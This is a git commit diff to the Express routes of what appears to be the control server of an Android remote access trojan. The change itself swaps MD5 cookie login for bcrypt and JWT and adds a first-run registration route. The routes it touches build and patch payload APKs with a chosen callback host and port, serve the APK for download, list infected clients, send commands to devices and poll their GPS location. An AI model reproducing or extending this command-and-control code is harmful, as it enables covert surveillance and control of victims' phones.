8788169e852fe145142e3184080e64c11d32e73a
karima940 <63523346+karima940@users.noreply.github.com>
2022-06-19 00:32:02 +0200

    Update expressRoutes.js
    Added jwt and registration feature

--- server/includes/expressRoutes.js
+++ server/includes/expressRoutes.js
@@ -3,7 +3,9 @@ const
     routes = express.Router(),
     cookieParser = require('cookie-parser'),
     bodyParser = require('body-parser'),
-    crypto = require('crypto');
+    bcrypt = require('bcrypt'),
+    { createToken } = require('../middlewares/auth.jwt'),
+    { verifyToken } = require('../middlewares/auth.jwt');
 
 let CONST = global.CONST;
 let db = global.db;
@@ -16,21 +18,11 @@ app.use(cookieParser());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 
-function isAllowed(req, res, next) {
-    let cookies = req.cookies;
-    let loginToken = db.maindb.get('admin.loginToken').value();
-    if ('loginToken' in cookies) {
-        if (cookies.loginToken === loginToken) next();
-        else res.clearCookie('token').redirect('/login');
-    } else res.redirect('/login');
-    // next();
-}
-
 routes.get('/dl', (req, res) => {
     res.redirect('/build.s.apk');
 });
 
-routes.get('/', isAllowed, (req, res) => {
+routes.get('/', verifyToken, (req, res) => {
     res.render('index', {
         clientsOnline: clientManager.getClientListOnline(),
         clientsOffline: clientManager.getClientListOffline()
@@ -38,38 +30,80 @@ routes.get('/', isAllowed, (req, res) => {
 });
 
 
+routes.get('/register', (req, res) => {
+    const register = db.maindb.get('admin').get('register').value();
+    if (register !== false) {
+        res.render('register');
+    } else {
+        res.redirect('/login');
+    }
+}).post('/register', async (req, res) => {
+    const register = db.maindb.get('admin').get('register').value();
+    try {
+        if(register !== false) {
+            const { username, password } = req.body;
+            const hashedPassword = await bcrypt.hash(password, 10);
+            db.maindb.get('admin').assign({ username, password: hashedPassword }).write();
+            db.maindb.get('admin').assign({ register: false }).write();
+            res.redirect('/login');
+        } else {
+            res.json({
+                success: false,
+                message: 'Registration is disabled'
+            });
+            return;
+        }
+    }
+     catch (err) {
+        res.json({
+            success: false,
+            message: err.message,
+        });
+    }
+})
+
 routes.get('/login', (req, res) => {
     res.render('login');
+}).post('/login', async (req, res) => {
+    try {
+        const { username, password } = req.body;
+        user = db.maindb.get('admin.username').value();
+        pass = db.maindb.get('admin.password').value();
+        if (!user || user !== username) {
+          res.redirect('/login?e=badLogin');
+        } else {
+          const isValid = await bcrypt.compare(password, pass);
+          if (isValid) {
+            const token = createToken(user);
+            res.cookie('x-access-token', token, { httpOnly: true }).redirect('/');
+          } else {
+            res.json({
+              success: false,
+              message: 'Invalid password',
+            });
+          }
+        }
+      } catch (err) {
+        res.json({
+          success: false,
+          message: err.message,
+        });
+      }
 });
 
-routes.post('/login', (req, res) => {
-    if ('username' in req.body) {
-        if ('password' in req.body) {
-            let rUsername = db.maindb.get('admin.username').value();
-            let rPassword = db.maindb.get('admin.password').value();
-            let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
-            if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
-                let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
-                db.maindb.get('admin').assign({ loginToken }).write();
-                res.cookie('loginToken', loginToken).redirect('/');
-            } else return res.redirect('/login?e=badLogin');
-        } else return res.redirect('/login?e=missingPassword');
-    } else return res.redirect('/login?e=missingUsername');
-});
-
-routes.get('/logout', isAllowed, (req, res) => {
-    db.maindb.get('admin').assign({ loginToken: '' }).write();
-    res.redirect('/');
+routes.get('/logout', verifyToken, (req, res) => {
+    res.clearCookie('x-access-token');
+    res.redirect('/login');
 });
 
 
-routes.get('/builder', isAllowed, (req, res) => {
+routes.get('/builder', verifyToken, (req, res) => {
     res.render('builder', {
         myPort: CONST.control_port
     });
 });
 
-routes.post('/builder', isAllowed, (req, res) => {
+routes.post('/builder', verifyToken, (req, res) => {
     if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
         if (!error) apkBuilder.buildAPK((error) => {
             if (!error) {
@@ -93,7 +127,7 @@ routes.post('/builder', isAllowed, (req, res) => {
 });
 
 
-routes.get('/logs', isAllowed, (req, res) => {
+routes.get('/logs', verifyToken, (req, res) => {
     res.render('logs', {
         logs: logManager.getLogs()
     });
@@ -101,7 +135,7 @@ routes.get('/logs', isAllowed, (req, res) => {
 
 
 
-routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
+routes.get('/manage/:deviceid/:page', verifyToken, (req, res) => {
     let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
     if (pageData) res.render('deviceManager', {
         page: req.params.page,
@@ -116,14 +150,14 @@ routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
     });
 });
 
-routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
+routes.post('/manage/:deviceid/:commandID', verifyToken, (req, res) => {
     clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
         if (!error) res.json({ error: false, message })
         else res.json({ error })
     });
 });
 
-routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
+routes.post('/manage/:deviceid/GPSPOLL/:speed', verifyToken, (req, res) => {
     clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
         if (!error) res.json({ error: false })
         else res.json({ error })
